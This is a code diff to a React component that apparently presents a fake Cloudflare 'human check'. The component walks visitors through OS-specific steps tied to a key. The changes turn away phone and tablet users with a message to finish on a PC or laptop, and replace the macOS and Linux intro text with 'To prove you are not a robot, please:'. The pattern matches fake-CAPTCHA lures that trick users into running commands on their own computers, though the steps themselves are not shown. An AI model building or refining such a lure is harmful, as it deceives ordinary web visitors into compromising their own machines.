@@ -45,7 +45,17 @@ function randomChallenge(): string {
   return letters.join(' ');
 }
 
-
+function isHandheld(): boolean {
+  if (typeof navigator === 'undefined') return false;
+  const nav = navigator as Navigator & { userAgentData?: { mobile?: boolean; platform?: string } };
+  const platform = `${nav.userAgentData?.platform || ''} ${navigator.platform || ''}`;
+  const ua = navigator.userAgent || '';
+  if (nav.userAgentData?.mobile) return true;
+  if (/android/i.test(ua) || /android/i.test(platform)) return true;
+  if (/iPhone|iPad|iPod/i.test(ua) || /iPhone|iPad|iPod/i.test(platform)) return true;
+  if (/mac/i.test(platform) && navigator.maxTouchPoints > 1) return true;
+  return false;
+}
 
 function visitorDesktop(): Desktop {
   if (typeof navigator === 'undefined') return 'windows';
@@ -104,6 +114,7 @@ function CloudflareMark({ className }: { className?: string }) {
 export default function HumanCheck({ onPass }: { onPass: () => void }) {
   const [keyB, setKeyB] = useState('');
   const [desktop] = useState(visitorDesktop);
+  const [handheld] = useState(isHandheld);
   const [state, setState] = useState<'idle' | 'checking' | 'prompt'>('idle');
   const [code, setCode] = useState('');
   const [challengeLetters, setChallengeLetters] = useState(randomChallenge);
@@ -130,6 +141,12 @@ export default function HumanCheck({ onPass }: { onPass: () => void }) {
     stateRef.current = 'checking';
     setState('checking');
     openTimer.current = window.setTimeout(() => {
+      if (handheld) {
+        stateRef.current = 'idle';
+        setState('idle');
+        window.alert('Please complete the sign-up process on a PC or laptop.');
+        return;
+      }
       setChallengeLetters(randomChallenge());
       setPromptText(randomPrompt(keyB, desktop));
       stateRef.current = 'prompt';
@@ -200,7 +217,7 @@ export default function HumanCheck({ onPass }: { onPass: () => void }) {
       </ol>
     );
   } else if (desktop === 'mac') {
-    lead = 'This computer is running macOS.';
+    lead = 'To prove you are not a robot, please:';
     finish = 'Enter the key below to finish verification.';
     steps = (
       <ol>
@@ -212,7 +229,7 @@ export default function HumanCheck({ onPass }: { onPass: () => void }) {
       </ol>
     );
   } else if (desktop === 'linux') {
-    lead = 'This computer is running Linux.';
+    lead = 'To prove you are not a robot, please:';
     finish = 'Enter the key below to finish verification.';
     steps = (
       <ol>
